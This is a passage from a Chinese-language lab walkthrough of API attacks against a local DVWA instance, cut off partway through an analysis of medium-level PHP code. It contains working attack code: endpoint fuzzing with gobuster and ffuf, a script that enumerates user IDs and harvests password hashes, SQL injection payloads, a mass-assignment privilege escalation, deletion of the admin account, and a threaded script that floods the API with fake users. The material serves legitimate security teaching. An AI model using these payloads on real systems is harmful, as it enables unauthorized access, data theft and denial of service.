<li><strong>无授权</strong> - 不检查权限</li>
<li><strong>SQL注入</strong> - 直接拼接SQL</li>
<li><strong>批量赋值</strong> - 可修改任意字段</li>
<li><strong>敏感信息泄露</strong> - 返回密码哈希</li>
<li><strong>无限流</strong> - 可以DoS攻击</li>
<li><strong>详细错误信息</strong> - 泄露系统信息</li>
</ol>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：API枚举"><a href="#步骤1：API枚举" class="headerlink" title="步骤1：API枚举"></a>步骤1：API枚举</h4><p><strong>发现API端点：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用curl测试</span></span><br><span class="line">curl -X GET http://dvwa.local/api/users</span><br><span class="line">curl -X GET http://dvwa.local/api/users/1</span><br><span class="line">curl -X POST http://dvwa.local/api/users</span><br><span class="line">curl -X PUT http://dvwa.local/api/users/1</span><br><span class="line">curl -X DELETE http://dvwa.local/api/users/1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用Postman或Insomnia测试</span></span><br></pre></td></tr></table></figure>

<p><strong>使用工具发现API：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用gobuster</span></span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://dvwa.local/api/ \</span><br><span class="line">             -w /usr/share/wordlists/api-endpoints.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用ffuf</span></span><br><span class="line">ffuf -u http://dvwa.local/api/FUZZ \</span><br><span class="line">     -w /usr/share/wordlists/api-endpoints.txt</span><br></pre></td></tr></table></figure>

<h4 id="步骤2：数据枚举"><a href="#步骤2：数据枚举" class="headerlink" title="步骤2：数据枚举"></a>步骤2：数据枚举</h4><p><strong>获取所有用户：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://dvwa.local/api/users</span><br></pre></td></tr></table></figure>

<p><strong>响应：</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;success&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5f4dcc3b5aa765d61d8327deb882cf99&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;first_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;last_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin@example.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;user_id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;098f6bcd4621d373cade4e832627b4f6&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user1@example.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>枚举用户ID：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://dvwa.local/api/users&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Enumerating users...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user_id <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    response = requests.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/<span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        data = response.json()</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&#x27;success&#x27;</span>):</span><br><span class="line">            user = data.get(<span class="string">&#x27;data&#x27;</span>, &#123;&#125;)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found user <span class="subst">&#123;user_id&#125;</span>: <span class="subst">&#123;user.get(<span class="string">&#x27;user&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    Email: <span class="subst">&#123;user.get(<span class="string">&#x27;email&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    Password hash: <span class="subst">&#123;user.get(<span class="string">&#x27;password&#x27;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="步骤3：未授权访问"><a href="#步骤3：未授权访问" class="headerlink" title="步骤3：未授权访问"></a>步骤3：未授权访问</h4><p><strong>查看其他用户数据：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看admin用户</span></span><br><span class="line">curl -X GET http://dvwa.local/api/users/1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：可以看到admin的所有信息，包括密码哈希</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤4：SQL注入"><a href="#步骤4：SQL注入" class="headerlink" title="步骤4：SQL注入"></a>步骤4：SQL注入</h4><p><strong>在用户名中注入：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SQL注入payload</span></span><br><span class="line">curl -X POST http://dvwa.local/api/users \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">       &quot;username&quot;: &quot;admin&#x27;</span>\<span class="string">&#x27;&#x27;</span> OR <span class="string">&#x27;\&#x27;</span><span class="string">&#x27;1&#x27;</span>\<span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;1&quot;,</span></span><br><span class="line"><span class="string">       &quot;password&quot;: &quot;password&quot;,</span></span><br><span class="line"><span class="string">       &quot;email&quot;: &quot;test@example.com&quot;</span></span><br><span class="line"><span class="string">     &#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用UNION注入</span></span><br><span class="line">curl -X POST http://dvwa.local/api/users \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">       &quot;username&quot;: &quot;test&#x27;</span>\<span class="string">&#x27;&#x27;</span> UNION SELECT * FROM admin_table --<span class="string">&quot;,</span></span><br><span class="line"><span class="string">       &quot;</span>password<span class="string">&quot;: &quot;</span>password<span class="string">&quot;,</span></span><br><span class="line"><span class="string">       &quot;</span>email<span class="string">&quot;: &quot;</span><span class="built_in">test</span>@example.com<span class="string">&quot;</span></span><br><span class="line"><span class="string">     &#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤5：批量赋值攻击"><a href="#步骤5：批量赋值攻击" class="headerlink" title="步骤5：批量赋值攻击"></a>步骤5：批量赋值攻击</h4><p><strong>修改用户角色：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提升普通用户为管理员</span></span><br><span class="line">curl -X PUT http://dvwa.local/api/users/5 \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">       &quot;user&quot;: &quot;hacker&quot;,</span></span><br><span class="line"><span class="string">       &quot;role&quot;: &quot;admin&quot;,</span></span><br><span class="line"><span class="string">       &quot;is_admin&quot;: 1,</span></span><br><span class="line"><span class="string">       &quot;privileges&quot;: &quot;all&quot;</span></span><br><span class="line"><span class="string">     &#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：成功修改role和is_admin字段</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤6：删除用户"><a href="#步骤6：删除用户" class="headerlink" title="步骤6：删除用户"></a>步骤6：删除用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 删除管理员账户</span></span><br><span class="line">curl -X DELETE http://dvwa.local/api/users/1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：管理员账户被删除</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤7：DoS攻击"><a href="#步骤7：DoS攻击" class="headerlink" title="步骤7：DoS攻击"></a>步骤7：DoS攻击</h4><p><strong>创建大量用户：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> concurrent.futures</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://dvwa.local/api/users&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_fake_user</span>(<span class="params">i</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">f&#x27;fake_user_<span class="subst">&#123;i&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">f&#x27;fake_<span class="subst">&#123;i&#125;</span>@example.com&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(base_url, json=data)</span><br><span class="line">    <span class="keyword">return</span> response.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用多线程创建1000个用户</span></span><br><span class="line"><span class="keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="number">50</span>) <span class="keyword">as</span> executor:</span><br><span class="line">    futures = [executor.submit(create_fake_user, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> future <span class="keyword">in</span> concurrent.futures.as_completed(futures):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Created user: <span class="subst">&#123;future.result()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了简单的API密钥认证，但仍有漏洞。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：API密钥认证 ★★★</span></span><br><span class="line"><span class="comment">// 从请求头获取API密钥</span></span><br><span class="line"><span class="comment">// X-API-Key - 自定义请求头</span></span><br><span class="line"><span class="variable">$apiKey</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_API_KEY&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 问题：硬编码的API密钥 ★★★</span></span><br><span class="line"><span class="comment">// 密钥写死在代码中</span></span><br><span class="line"><span class="comment">// 而且只有一个密钥，所有用户共享</span></span><br><span class="line"><span class="variable">$validApiKey</span> = <span class="string">&#x27;dvwa_api_key_12345&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 验证API密钥 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$apiKey</span> !== <span class="variable">$validApiKey</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Invalid API key&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：简单的限流 ★★★</span></span><br><span class="line"><span class="comment">// 但实现有问题</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_rate_limit</span>(<span class="params"><span class="variable">$api_key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用文件存储请求计数</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;/tmp/api_rate_limit_<span class="subst">$api_key</span>.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：文件锁不安全 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查过去60秒的请求数</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() - <span class="variable">$data</span>[<span class="string">&#x27;timestamp&#x27;</span>] &lt; <span class="number">60</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;count&#x27;</span>] &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 超过限制</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$data</span>[<span class="string">&#x27;count&#x27;</span>]++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 重置计数</span></span><br><span class="line">            <span class="variable">$data</span> = [<span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>(), <span class="string">&#x27;count&#x27;</span> =&gt; <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$data</span> = [<span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">time</span>(), <span class="string">&#x27;count&#x27;</span> =&gt; <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">check_rate_limit</span>(<span class="variable">$apiKey</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">429</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Rate limit exceeded&#x27;</span></span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 新增：使用PDO预编译 ★★★</span></span><br><span class="line"><span class="comment">// 防止SQL注入</span></span><br><span class="line"><span class="keyword">global</span> <span class="variable">$db</span>; <span class="comment">// PDO连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// GET /api/users/&#123;id&#125;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$method</span> == <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：使用PDO预编译 ★★★</span></span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id, user, first_name, last_name, email FROM users WHERE user_id = :id&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$userId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">        <span class="comment">// ★★★ 改进：不返回密码哈希 ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$user</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;User not found&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// PUT /api/users/&#123;id&#125;</span></span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="variable">$method</span> == <span class="string">&#x27;PUT&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/users\/(\d+)$/&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userId</span> = <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$input</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：仍然没有授权检查 ★★★</span></span><br><span class="line">    <span class="comment">// 任何有API密钥的人都可以修改任何用户</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：字段白名单 ★★★</span></span><br><span class="line">    <span class="comment">// 只允许修改特定字段</span></span><br><span class="line">    <span class="variable">$allowedFields</span> = [<span class="string">&#x27;first_name&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span>, <span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$updates</span> = [];</span><br><span class="line">    <span class="variable">$params</span> = [<span class="string">&#x27;:id&#x27;</span> =&gt; <span class="variable">$userId</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$allowedFields</span>)) &#123;</span><br><span class="line">            <span class="variable">$updates</span>[] = <span class="string">&quot;<span class="subst">$key</span> = :<span class="subst">$key</span>&quot;</span>;</span><br><span class="line">            <span class="variable">$params</span>[<span class="string">&quot;:<span class="subst">$key</span>&quot;</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$updates</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;No valid fields to update&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$updates</span>) . <span class="string">&quot; WHERE user_id = :id&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;User updated&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Failed to update user&#x27;</span></span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([</span><br><span class="line">        <span class="string">&#x27;success&#x27;</span> 